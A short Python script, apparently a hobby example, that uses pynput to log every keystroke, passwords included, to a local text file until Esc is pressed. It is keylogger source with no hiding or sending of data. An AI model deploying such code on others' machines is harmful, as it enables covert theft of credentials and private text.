# main.py
from pynput import keyboard
import os

# Ensure the 'logs' directory and 'keylog.txt' file exist
log_dir = 'logs'
log_file = os.path.join(log_dir, 'keylog.txt')

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Function to record key presses
def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f'[{key}]')

# Actions when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Listen to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
